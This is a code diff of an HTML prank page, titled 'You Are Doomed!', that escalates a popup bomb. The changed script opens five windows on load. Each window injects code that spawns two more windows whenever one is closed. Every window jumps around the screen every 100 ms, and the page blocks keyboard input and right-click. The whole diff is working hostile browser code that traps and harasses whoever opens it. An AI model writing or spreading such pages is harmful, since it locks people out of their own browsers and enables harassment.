@@ -1,46 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>😂 You Are Stuck!</title>
+    <title>😂 You Are Doomed!</title>
     <script>
-        let popups = [];
-
         function spawnPopup() {
-            let w = window.open("", "", `width=300,height=200,left=${Math.random()*screen.width},top=${Math.random()*screen.height}`);
+            let x = Math.random() * screen.width;
+            let y = Math.random() * screen.height;
+
+            let w = window.open("", "", `width=300,height=200,left=${x},top=${y}`);
             if (w) {
                 w.document.write("<h1>You Can't Escape! 😈</h1>");
-                w.document.write("<script>window.onbeforeunload = function() { opener.spawnPopup(); opener.spawnPopup(); };<\/script>");
-                movePopup(w);
-                popups.push(w);
+                w.document.write(`
+                    <script>
+                        function spawnPopup() {
+                            let x = Math.random() * screen.width;
+                            let y = Math.random() * screen.height;
+                            let win = window.open('', '', 'width=300,height=200,left=' + x + ',top=' + y);
+                            if (win) {
+                                win.document.write('<h1>You Are Doomed! 😂</h1>');
+                                win.document.write('<script>window.onbeforeunload = function() { opener.spawnPopup(); opener.spawnPopup(); }; setInterval(() => { let x = Math.random() * screen.width; let y = Math.random() * screen.height; window.moveTo(x, y); }, 100);</scr' + 'ipt>');
+                            }
+                        }
+                        window.onbeforeunload = function() { spawnPopup(); spawnPopup(); };
+                        setInterval(() => { let x = Math.random() * screen.width; let y = Math.random() * screen.height; window.moveTo(x, y); }, 100);
+                    <\/script>
+                `);
+
+                setInterval(() => {
+                    x += (Math.random() * 200 - 100);
+                    y += (Math.random() * 200 - 100);
+                    w.moveTo(x, y);
+                }, 100);
             }
         }
 
-        function movePopup(win) {
-            let x = Math.random() * screen.width;
-            let y = Math.random() * screen.height;
-            setInterval(() => {
-                if (!win.closed) {
-                    x += (Math.random() * 50 - 25);
-                    y += (Math.random() * 50 - 25);
-                    win.moveTo(x, y);
-                }
-            }, 200);
-        }
-
         function startMadness() {
-            for (let i = 0; i < 3; i++) spawnPopup();
+            for (let i = 0; i < 5; i++) spawnPopup();
         }
 
         // Disable keyboard and right-click
         document.onkeydown = function () { return false; };
         document.oncontextmenu = function () { return false; };
 
-        // Start on load
+        // Start madness on load
         window.onload = startMadness;
     </script>
 </head>
 <body>
-    <h1>Click anywhere to start...</h1>
+    <h1>Click anywhere to unleash chaos...</h1>
     <script>
         document.body.onclick = startMadness;
     </script>
